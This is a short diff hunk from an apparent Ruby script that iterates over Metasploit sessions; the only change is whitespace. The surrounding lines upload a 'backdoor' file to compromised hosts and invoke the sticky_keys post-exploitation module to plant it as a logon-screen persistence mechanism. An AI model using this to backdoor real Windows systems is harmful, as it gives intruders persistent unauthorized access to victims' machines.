@@ -63,7 +63,7 @@ framework.sessions.each do |num,session|
 
 	## not working ##
 	session.fs.file.upload_file("#{targetfile}","#{backdoor}")
-	
+
 	### Sticky Keys ###
 	run_single("post/windows/manage/sticky_keys")
 	run_single("set EXE #{targetfile}")
